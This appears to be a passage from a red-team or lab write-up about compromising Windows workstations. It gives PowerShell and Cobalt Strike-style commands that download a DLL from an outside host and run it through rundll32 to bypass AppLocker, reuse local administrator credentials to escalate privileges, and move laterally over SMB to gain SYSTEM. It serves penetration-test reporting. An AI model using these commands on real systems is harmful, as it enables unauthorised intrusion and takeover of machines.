#### Initial Access

```powershell
iwr http://www.bleepincomputer.com/update  -OutFile C:\Windows\System32\Tasks\update.dll
rundll32.exe C:\Windows\System32\Tasks\update.dll,StartW
```

Payload execution via DLL sideloading using `rundll32`. Execution is performed from a system path (`System32\Tasks`) to blend with scheduled task artifacts (AppLocker bypass).

#### Privilege Escalation (EOP)

```powershell
spawnas DUB-WKSTN-2\Administrator REDACTED_SECRET http
```

Local administrator credentials are reused to elevate privileges on the host. This confirms:

- The local `Administrator` password is valid
- Local credentials are reused across machines

#### Lateral Movement

```powershell
ls \\DUB-WKSTN-1\C$

# Lateral movement
jump scshell64 dub-wkstn-1 http
# Result: SYSTEM on DUB-WKSTN-1
```

Successful access to remote SMB resources using reused credentials.

- Group membership GPOs do not affect SMB authentication
- Local credential reuse enables lateral movement even with group restrictions in place
